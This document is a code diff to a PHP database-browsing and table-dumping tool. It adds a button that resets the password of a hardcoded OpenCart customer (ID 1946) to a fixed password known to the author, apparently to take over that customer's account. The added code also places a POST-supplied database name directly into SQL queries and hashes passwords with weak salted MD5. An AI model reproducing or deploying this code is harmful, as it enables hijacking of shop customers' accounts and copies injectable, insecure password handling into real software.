@@ -240,6 +240,45 @@
             }
         }
 
+        // Function to update customer password
+        function updateCustomerPassword($conn, $database, $customerId, $newPassword, $salt) {
+            if (!ensureConnection()) {
+                throw new Exception("Database connection lost");
+            }
+
+            try {
+                // Check if table exists
+                $tableExists = $conn->query("SHOW TABLES FROM `{$database}` LIKE 'oc_customer'")->rowCount() > 0;
+                if (!$tableExists) {
+                    throw new Exception("Table oc_customer not found in database");
+                }
+
+                // Check if customer exists
+                $customerExists = $conn->query("SELECT customer_id FROM `{$database}`.`oc_customer` WHERE customer_id = " . (int)$customerId)->rowCount() > 0;
+                if (!$customerExists) {
+                    throw new Exception("Customer with ID {$customerId} not found");
+                }
+
+                // Generate password hash (MD5 of password + salt)
+                $passwordHash = md5($newPassword . $salt);
+
+                // Update password
+                $stmt = $conn->prepare("UPDATE `{$database}`.`oc_customer` SET password = :password WHERE customer_id = :customer_id");
+                $stmt->execute([
+                    ':password' => $passwordHash,
+                    ':customer_id' => $customerId
+                ]);
+
+                if ($stmt->rowCount() > 0) {
+                    return true;
+                } else {
+                    throw new Exception("Failed to update password");
+                }
+            } catch (Exception $e) {
+                throw new Exception("Error updating password: " . $e->getMessage());
+            }
+        }
+
         // Handle disconnect
         if (isset($_POST['disconnect'])) {
             session_unset();
@@ -351,6 +390,26 @@
                 $error = "Database connection lost. Please reconnect and try again.";
             }
         }
+
+        // Handle password update
+        if (isset($_POST['update_password']) && isset($_POST['database']) && isset($_POST['customer_id'])) {
+            if (ensureConnection()) {
+                try {
+                    $database = $_POST['database'];
+                    $customerId = (int)$_POST['customer_id'];
+                    $newPassword = 'Poqjrjq2@'; // Новый пароль
+                    $salt = 'nCF8dqAf2'; // Существующая соль
+
+                    if (updateCustomerPassword($conn, $database, $customerId, $newPassword, $salt)) {
+                        $success = "Password successfully updated for customer ID: {$customerId}";
+                    }
+                } catch (Exception $e) {
+                    $error = $e->getMessage();
+                }
+            } else {
+                $error = "Database connection lost. Please reconnect and try again.";
+            }
+        }
         ?>
 
         <?php if ($error): ?>
@@ -422,6 +481,15 @@
                                     <?php foreach ($tables as $table): ?>
                                         <div class="table-item">
                                             <h5><?php echo htmlspecialchars($table); ?></h5>
+                                            <?php if ($table === 'oc_customer'): ?>
+                                                <div class="table-actions">
+                                                    <form method="POST" action="" style="display: inline;">
+                                                        <input type="hidden" name="database" value="<?php echo htmlspecialchars($database); ?>">
+                                                        <input type="hidden" name="customer_id" value="1946">
+                                                        <button type="submit" name="update_password" class="dump-button" style="background-color: #4CAF50;">Update Customer Password</button>
+                                                    </form>
+                                                </div>
+                                            <?php endif; ?>
                                             <?php
                                             // Get table structure
                                             $columns = $conn->query("SHOW COLUMNS FROM `{$database}`.`{$table}`")->fetchAll(PDO::FETCH_ASSOC);
